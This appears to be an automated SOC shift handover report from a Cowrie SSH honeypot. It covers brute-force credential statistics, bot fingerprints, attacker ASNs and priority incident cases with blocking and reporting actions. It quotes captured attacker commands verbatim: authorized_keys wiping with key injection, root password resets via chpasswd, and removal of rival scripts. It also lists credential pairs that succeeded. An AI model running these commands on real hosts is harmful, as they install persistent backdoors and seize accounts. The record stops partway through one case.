# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-23 |
| **Generated At** | 2026-05-23T20:58:33Z |
| **Shift Time** | 20:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **171** |
| Confirmed Threats | **166** |
| False Positives Filtered | **5** (2.9%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **9** |
| High Severity Cases | **21** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **150** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **41** |
| Unique Credential Pairs | **24** |
| Unique Usernames | **12** |
| Unique Passwords | **23** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `345gs5662d34` | 10 |
| `onkar` | 1 |
| `systems` | 1 |
| `eric` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 9 |
| `1234` | 2 |
| `Admin@123` | 1 |
| `onkar123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 9 |
| `root` | `Admin@123` | 1 |
| `onkar` | `onkar123` | 1 |
| `root` | `Aa987654321` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin@123` | `147.45.135.69` | 2026-05-23T19:19:07 |
| `root` | `3245gs5662d34` | `147.45.135.69` | 2026-05-23T19:19:15 |
| `root` | `Aa987654321` | `100.54.149.28` | 2026-05-23T19:25:51 |
| `root` | `3245gs5662d34` | `100.54.149.28` | 2026-05-23T19:25:56 |
| `root` | `Voda@123` | `14.103.114.89` | 2026-05-23T19:33:44 |
| `root` | `root2022@` | `100.54.149.28` | 2026-05-23T19:35:20 |
| `root` | `Adm@2024` | `100.54.149.28` | 2026-05-23T19:38:20 |
| `root` | `@A123456` | `100.54.149.28` | 2026-05-23T19:54:06 |
| `root` | `1234qwer!!` | `100.54.149.28` | 2026-05-23T20:00:22 |
| `root` | `Cj123456` | `100.54.149.28` | 2026-05-23T20:03:32 |
| `root` | `Abc#123456` | `100.54.149.28` | 2026-05-23T20:06:49 |
| `root` | `Qwer4321` | `120.48.175.122` | 2026-05-23T20:22:41 |
| `root` | `3245gs5662d34` | `120.48.175.122` | 2026-05-23T20:22:51 |
| `root` | `Hy123456` | `120.48.175.122` | 2026-05-23T20:32:03 |
| `root` | `wkdskfk` | `120.48.175.122` | 2026-05-23T20:36:39 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **171** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 57 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 32 | 2 |
| `03a80b21afa8...` | Modern SSH client | 23 | 2 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 32 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 23 | 2 | Modern SSH client |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:wX3X0iVsPI4J"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.175.122`, `14.103.114.89`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:W0cfjLj4Y2gq"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.175.122`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.175.122`, `147.45.135.69`, `100.54.149.28`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **17** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS138423` | CMPak Limited | 1 | MEDIUM |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |
| `AS210976` | Timeweb, LLP | 1 | HIGH |
| `AS28573` | Claro NXT Telecomunicacoes Ltda | 1 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (21)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b4d6d1e7413e

| Field | Detail |
|---|---|
| **Source IP** | `147.45.135[.]69` |
| **First Seen** | 2026-05-23 19:19 |
| **Last Seen** | 2026-05-23 19:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:19:06` | `cowrie.session.connect` |
| `2026-05-23 19:19:06` | `cowrie.client.version` |
| `2026-05-23 19:19:07` | `cowrie.client.kex` |
| `2026-05-23 19:19:07` | `cowrie.login.success` |
| `2026-05-23 19:19:07` | `cowrie.session.params` |
| `2026-05-23 19:19:07` | `cowrie.command.input` |
| `2026-05-23 19:19:07` | `cowrie.command.failed` |
| `2026-05-23 19:19:08` | `cowrie.log.closed` |
| `2026-05-23 19:19:08` | `cowrie.session.params` |
| `2026-05-23 19:19:08` | `cowrie.command.input` |
| `2026-05-23 19:19:08` | `cowrie.session.file_download` |
| `2026-05-23 19:19:08` | `cowrie.log.closed` |
| `2026-05-23 19:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.135[.]69` to AbuseIPDB if not already reported
- [ ] Block `147.45.135[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fee046a2ea

| Field | Detail |
|---|---|
| **Source IP** | `147.45.135[.]69` |
| **First Seen** | 2026-05-23 19:19 |
| **Last Seen** | 2026-05-23 19:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:19:14` | `cowrie.session.connect` |
| `2026-05-23 19:19:14` | `cowrie.client.version` |
| `2026-05-23 19:19:14` | `cowrie.client.kex` |
| `2026-05-23 19:19:15` | `cowrie.login.success` |
| `2026-05-23 19:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.135[.]69` to AbuseIPDB if not already reported
- [ ] Block `147.45.135[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e16c607ba4bd

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 19:25 |
| **Last Seen** | 2026-05-23 19:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:25:50` | `cowrie.session.connect` |
| `2026-05-23 19:25:50` | `cowrie.client.version` |
| `2026-05-23 19:25:51` | `cowrie.client.kex` |
| `2026-05-23 19:25:51` | `cowrie.login.success` |
| `2026-05-23 19:25:52` | `cowrie.session.params` |
| `2026-05-23 19:25:52` | `cowrie.command.input` |
| `2026-05-23 19:25:52` | `cowrie.command.failed` |
| `2026-05-23 19:25:52` | `cowrie.log.closed` |
| `2026-05-23 19:25:52` | `cowrie.session.params` |
| `2026-05-23 19:25:52` | `cowrie.command.input` |
| `2026-05-23 19:25:53` | `cowrie.session.file_download` |
| `2026-05-23 19:25:53` | `cowrie.log.closed` |
| `2026-05-23 19:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0ecc4964c6

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 19:25 |
| **Last Seen** | 2026-05-23 19:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:25:55` | `cowrie.session.connect` |
| `2026-05-23 19:25:55` | `cowrie.client.version` |
| `2026-05-23 19:25:55` | `cowrie.client.kex` |
| `2026-05-23 19:25:56` | `cowrie.login.success` |
| `2026-05-23 19:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f663ca16ce9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]89` |
| **First Seen** | 2026-05-23 19:33 |
| **Last Seen** | 2026-05-23 19:34 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wX3X0iVsPI4J"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:33:42` | `cowrie.session.connect` |
| `2026-05-23 19:33:42` | `cowrie.client.version` |
| `2026-05-23 19:33:43` | `cowrie.client.kex` |
| `2026-05-23 19:33:44` | `cowrie.login.success` |
| `2026-05-23 19:33:45` | `cowrie.session.params` |
| `2026-05-23 19:33:45` | `cowrie.command.input` |
| `2026-05-23 19:33:45` | `cowrie.command.failed` |
| `2026-05-23 19:33:45` | `cowrie.log.closed` |
| `2026-05-23 19:33:46` | `cowrie.session.params` |
| `2026-05-23 19:33:46` | `cowrie.command.input` |
| `2026-05-23 19:33:46` | `cowrie.session.file_download` |
| `2026-05-23 19:33:46` | `cowrie.log.closed` |
| `2026-05-23 19:33:56` | `cowrie.session.params` |
| `2026-05-23 19:33:56` | `cowrie.command.input` |
| `2026-05-23 19:33:56` | `cowrie.log.closed` |
| `2026-05-23 19:33:57` | `cowrie.session.params` |
| `2026-05-23 19:33:57` | `cowrie.command.input` |
| `2026-05-23 19:33:58` | `cowrie.log.closed` |
| `2026-05-23 19:33:58` | `cowrie.session.params` |
| `2026-05-23 19:33:58` | `cowrie.command.input` |
| `2026-05-23 19:33:59` | `cowrie.session.file_download` |
| `2026-05-23 19:33:59` | `cowrie.log.closed` |
| `2026-05-23 19:33:59` | `cowrie.session.params` |
| `2026-05-23 19:33:59` | `cowrie.command.input` |
| `2026-05-23 19:34:00` | `cowrie.log.closed` |
| `2026-05-23 19:34:01` | `cowrie.session.params` |
| `2026-05-23 19:34:01` | `cowrie.command.input` |
| `2026-05-23 19:34:02` | `cowrie.log.closed` |
| `2026-05-23 19:34:03` | `cowrie.session.params` |
| `2026-05-23 19:34:03` | `cowrie.command.input` |
| `2026-05-23 19:34:03` | `cowrie.command.input` |
| `2026-05-23 19:34:03` | `cowrie.log.closed` |
| `2026-05-23 19:34:05` | `cowrie.session.params` |
| `2026-05-23 19:34:05` | `cowrie.command.input` |
| `2026-05-23 19:34:05` | `cowrie.log.closed` |
| `2026-05-23 19:34:06` | `cowrie.session.params` |
| `2026-05-23 19:34:06` | `cowrie.command.input` |
| `2026-05-23 19:34:06` | `cowrie.log.closed` |
| `2026-05-23 19:34:06` | `cowrie.session.params` |
| `2026-05-23 19:34:06` | `cowrie.command.input` |
| `2026-05-23 19:34:06` | `cowrie.log.closed` |
| `2026-05-23 19:34:07` | `cowrie.session.params` |
| `2026-05-23 19:34:07` | `cowrie.command.input` |
| `2026-05-23 19:34:07` | `cowrie.log.closed` |
| `2026-05-23 19:34:07` | `cowrie.session.params` |
| `2026-05-23 19:34:07` | `cowrie.command.input` |
| `2026-05-23 19:34:07` | `cowrie.log.closed` |
| `2026-05-23 19:34:07` | `cowrie.session.params` |
| `2026-05-23 19:34:07` | `cowrie.command.input` |
| `2026-05-23 19:34:08` | `cowrie.log.closed` |
| `2026-05-23 19:34:08` | `cowrie.session.params` |
| `2026-05-23 19:34:08` | `cowrie.command.input` |
| `2026-05-23 19:34:08` | `cowrie.log.closed` |
| `2026-05-23 19:34:08` | `cowrie.session.params` |
| `2026-05-23 19:34:08` | `cowrie.command.input` |
| `2026-05-23 19:34:08` | `cowrie.log.closed` |
| `2026-05-23 19:34:09` | `cowrie.session.params` |
| `2026-05-23 19:34:09` | `cowrie.command.input` |
| `2026-05-23 19:34:09` | `cowrie.log.closed` |
| `2026-05-23 19:34:09` | `cowrie.session.params` |
| `2026-05-23 19:34:09` | `cowrie.command.input` |
| `2026-05-23 19:34:09` | `cowrie.log.closed` |
| `2026-05-23 19:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]89` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da80531a8bf6

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 19:35 |
| **Last Seen** | 2026-05-23 19:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:35:19` | `cowrie.session.connect` |
| `2026-05-23 19:35:19` | `cowrie.client.version` |
| `2026-05-23 19:35:19` | `cowrie.client.kex` |
| `2026-05-23 19:35:20` | `cowrie.login.success` |
| `2026-05-23 19:35:20` | `cowrie.session.params` |
| `2026-05-23 19:35:20` | `cowrie.command.input` |
| `2026-05-23 19:35:20` | `cowrie.command.failed` |
| `2026-05-23 19:35:21` | `cowrie.log.closed` |
| `2026-05-23 19:35:21` | `cowrie.session.params` |
| `2026-05-23 19:35:21` | `cowrie.command.input` |
| `2026-05-23 19:35:21` | `cowrie.session.file_download` |
| `2026-05-23 19:35:21` | `cowrie.log.closed` |
| `2026-05-23 19:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff68d22c936f

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 19:35 |
| **Last Seen** | 2026-05-23 19:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:35:24` | `cowrie.session.connect` |
| `2026-05-23 19:35:24` | `cowrie.client.version` |
| `2026-05-23 19:35:24` | `cowrie.client.kex` |
| `2026-05-23 19:35:24` | `cowrie.login.success` |
| `2026-05-23 19:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d48c1b0c807b

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 19:38 |
| **Last Seen** | 2026-05-23 19:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:38:19` | `cowrie.session.connect` |
| `2026-05-23 19:38:19` | `cowrie.client.version` |
| `2026-05-23 19:38:19` | `cowrie.client.kex` |
| `2026-05-23 19:38:20` | `cowrie.login.success` |
| `2026-05-23 19:38:20` | `cowrie.session.params` |
| `2026-05-23 19:38:20` | `cowrie.command.input` |
| `2026-05-23 19:38:20` | `cowrie.command.failed` |
| `2026-05-23 19:38:21` | `cowrie.log.closed` |
| `2026-05-23 19:38:21` | `cowrie.session.params` |
| `2026-05-23 19:38:21` | `cowrie.command.input` |
| `2026-05-23 19:38:21` | `cowrie.session.file_download` |
| `2026-05-23 19:38:21` | `cowrie.log.closed` |
| `2026-05-23 19:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f974c28f2b1

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 19:38 |
| **Last Seen** | 2026-05-23 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:38:24` | `cowrie.session.connect` |
| `2026-05-23 19:38:24` | `cowrie.client.version` |
| `2026-05-23 19:38:24` | `cowrie.client.kex` |
| `2026-05-23 19:38:25` | `cowrie.login.success` |
| `2026-05-23 19:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e7b05f9c1e9

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 19:54 |
| **Last Seen** | 2026-05-23 19:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
